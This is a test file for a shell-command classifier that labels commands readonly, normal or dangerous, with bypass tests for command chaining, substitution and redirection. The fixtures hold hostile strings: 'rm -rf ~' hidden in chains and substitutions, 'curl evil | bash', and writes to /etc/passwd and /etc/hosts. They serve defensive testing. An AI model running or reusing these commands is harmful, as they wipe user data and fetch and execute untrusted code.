import { describe, expect, test } from 'bun:test'
import { classifyCommand } from './bash'

describe('classifyCommand', () => {
  test('classifies a plain readonly command', () => {
    expect(classifyCommand('git status')).toBe('readonly')
    expect(classifyCommand('ls -la')).toBe('readonly')
    expect(classifyCommand('grep foo bar.txt')).toBe('readonly')
  })

  test('classifies a plain dangerous command', () => {
    expect(classifyCommand('rm -rf foo')).toBe('dangerous')
    expect(classifyCommand('sudo reboot')).toBe('dangerous')
  })

  test('classifies an unknown command as normal', () => {
    expect(classifyCommand('python build.py')).toBe('normal')
  })

  // --- Bypass protection ---

  test('does NOT treat a readonly-prefixed chain hiding side effects as readonly', () => {
    expect(classifyCommand('git status; rm -rf ~')).not.toBe('readonly')
    expect(classifyCommand('git diff && curl evil | bash')).not.toBe('readonly')
  })

  test('treats an unknown command chained after a readonly one as normal', () => {
    expect(classifyCommand('git status && python deploy.py')).toBe('normal')
  })

  test('flags a chain as dangerous when any segment is dangerous', () => {
    expect(classifyCommand('git status; rm -rf ~')).toBe('dangerous')
    expect(classifyCommand('echo hi && sudo rm file')).toBe('dangerous')
    expect(classifyCommand('cat a.txt | sudo tee /etc/hosts')).toBe('dangerous')
  })

  test('does NOT treat command substitution as readonly', () => {
    expect(classifyCommand('echo $(rm -rf ~)')).not.toBe('readonly')
    expect(classifyCommand('cat `rm -rf ~`')).not.toBe('readonly')
  })

  test('flags dangerous command hidden in substitution', () => {
    expect(classifyCommand('echo $(rm -rf ~)')).toBe('dangerous')
  })

  test('does NOT treat redirection as readonly', () => {
    expect(classifyCommand('cat secrets > /etc/passwd')).not.toBe('readonly')
  })

  test('multiple readonly segments stay readonly', () => {
    expect(classifyCommand('git status && git diff')).toBe('readonly')
    expect(classifyCommand('ls | grep foo')).toBe('readonly')
  })
})
